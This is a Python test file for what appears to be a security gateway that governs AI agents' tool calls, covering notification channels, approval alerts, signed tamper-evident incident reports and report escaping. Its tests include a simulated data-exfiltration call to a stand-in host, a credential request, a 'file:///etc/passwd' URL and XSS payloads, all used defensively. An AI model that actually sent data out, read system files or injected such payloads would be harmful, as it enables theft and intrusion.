"""Out-of-band notifications and signed incident reports."""

from __future__ import annotations

import hashlib
import hmac
import json
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from sandbox.shadow import SandboxManager
from tests.helpers import call, headers

ADMIN = "SECURITY_ADMIN"


@pytest.fixture
def receiver():
    """A local HTTP endpoint standing in for Slack / Teams / ntfy / a webhook."""
    got: list[dict] = []

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):  # noqa: N802
            body = self.rfile.read(int(self.headers.get("Content-Length") or 0))
            got.append({"path": self.path, "headers": dict(self.headers), "body": body})
            self.send_response(200)
            self.end_headers()

        def log_message(self, *_a):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{server.server_address[1]}", got
    server.shutdown()


def _wait(got: list, n: int, timeout: float = 8.0) -> None:
    deadline = time.time() + timeout
    while len(got) < n and time.time() < deadline:
        time.sleep(0.05)


def _add_all(client, base: str) -> None:
    admin = headers(ADMIN)
    for body in ({"type": "slack", "url": f"{base}/slack"}, {"type": "teams", "url": f"{base}/teams"},
                 {"type": "ntfy", "url": f"{base}/ntfy", "token": "tk"}, {"type": "webhook", "url": f"{base}/hook", "secret": "s3cret"}):
        assert client.post("/v1/notifications/channels", headers=admin, json=body).status_code == 200, body


def test_channels_are_masked_and_admin_only(client, receiver):
    base, _ = receiver
    _add_all(client, base)
    cfg = client.get("/v1/notifications", headers=headers(ADMIN)).json()
    assert len(cfg["channels"]) == 4 and {c["type"] for c in cfg["channels"]} == {"slack", "teams", "ntfy", "webhook"}
    dumped = json.dumps(cfg)
    assert "s3cret" not in dumped and '"tk"' not in dumped  # secrets and tokens are never returned
    assert client.get("/v1/notifications", headers=headers("ANALYST")).status_code == 403
    assert client.post("/v1/notifications/channels", headers=headers(ADMIN), json={"type": "sms", "url": "https://x"}).status_code == 422
    assert client.post("/v1/notifications/channels", headers=headers(ADMIN), json={"type": "slack", "url": "file:///etc/passwd"}).status_code == 422


def test_test_notification_reaches_every_channel_in_its_format(client, receiver):
    base, got = receiver
    _add_all(client, base)
    out = client.post("/v1/notifications/test", headers=headers(ADMIN)).json()
    assert len(out["deliveries"]) == 4 and all(d["ok"] for d in out["deliveries"])
    by = {g["path"]: g for g in got}
    slack = json.loads(by["/slack"]["body"])
    assert slack["blocks"][0]["type"] == "section" and any(b["type"] == "actions" for b in slack["blocks"])
    teams = json.loads(by["/teams"]["body"])
    assert teams["attachments"][0]["contentType"] == "application/vnd.microsoft.card.adaptive"
    ntfy = by["/ntfy"]
    assert ntfy["headers"]["Title"].startswith("Test notification") and ntfy["headers"]["Authorization"] == "Bearer tk"
    hook = by["/hook"]
    expected = "sha256=" + hmac.new(b"s3cret", hook["body"], hashlib.sha256).hexdigest()
    assert hook["headers"]["X-Sentinel-Signature"] == expected and json.loads(hook["body"])["event"] == "test"
    history = client.get("/v1/notifications", headers=headers(ADMIN)).json()["history"]
    assert len(history) >= 4 and history[0]["ok"]


def test_approval_needed_is_pushed_with_the_effect_preview(client, receiver, stdio_server, workspace, monkeypatch):
    base, got = receiver
    assert client.post("/v1/notifications/channels", headers=headers(ADMIN), json={"type": "webhook", "url": f"{base}/hook"}).status_code == 200
    preview = {"headline": "Would modify 1 file", "files": [{"path": str(workspace / "report.txt"), "change": "modified"}], "counts": {}}
    monkeypatch.setattr(SandboxManager, "_preflight", lambda self, *a, **k: {
        "verdict": "SUSPICIOUS", "reasons": ["edits report.txt beyond the request"], "findings": [], "backend": "process",
        "unknown_hosts": [], "preview": preview})
    out = call(client, "wf-notify", "create_ticket", {"title": "x"}, headers(ADMIN), server_id=stdio_server)
    assert out["decision"] == "HUMAN_APPROVAL"
    _wait(got, 1)
    note = json.loads(got[0]["body"])
    assert note["event"] == "approval" and note["preview_headline"] == "Would modify 1 file"
    assert note["url"].endswith(f"/#/approve/approval/{out['approval_id']}")
    assert "x" not in json.dumps(note.get("details", {}))  # arguments are never sent out
    call(client, "wf-notify", "create_ticket", {"title": "x"}, headers(ADMIN), server_id=stdio_server)  # same pending approval
    time.sleep(0.5)
    assert len(got) == 1  # not re-sent for the same approval


def test_incident_report_is_signed_and_verifiable(client):
    admin, analyst = headers(ADMIN), headers()
    wf = "wf-incident"
    call(client, wf, "search_logs", {"query": "10.0.0.7"}, analyst)
    call(client, wf, "get_credentials", {"system": "vpn"}, admin)  # step-up required
    call(client, wf, "send_data", {"destination": "https://drop.example.net/x", "payload": "dump"}, headers(ADMIN, mfa=True))
    report = client.get(f"/v1/workflows/{wf}/report").json()
    s = report["summary"]
    assert s["calls"] >= 3 and s["receipts_verified"] == s["receipts_total"] >= 3 and s["escalated"] >= 1
    kinds = {t["kind"] for t in report["timeline"]}
    assert "decision" in kinds and report["timeline"] == sorted(report["timeline"], key=lambda t: t["at"])
    assert client.post("/v1/reports/verify", json=report).json()["valid"] is True
    report["summary"]["max_risk"] = 0  # tampering after export: hide how risky the session was
    assert client.post("/v1/reports/verify", json=report).json()["valid"] is False
    page = client.get(f"/v1/workflows/{wf}/report.html", params={"download": True})
    assert page.status_code == 200 and "default-src 'none'" in page.headers["content-security-policy"]
    assert "attachment" in page.headers["content-disposition"] and "incident report" in page.text
    assert client.get(f"/v1/workflows/{wf}/report.json").json()["workflow_id"] == wf
    assert client.get("/v1/workflows/does-not-exist/report").status_code == 404


def test_incident_report_escapes_recorded_content(client):
    wf = "wf-<script>alert(1)</script>"
    call(client, wf, "search_logs", {"query": "<img src=x onerror=alert(1)>"}, headers())
    page = client.get(f"/v1/workflows/{wf}/report.html").text
    assert "<script>alert(1)" not in page and "<img src=x" not in page
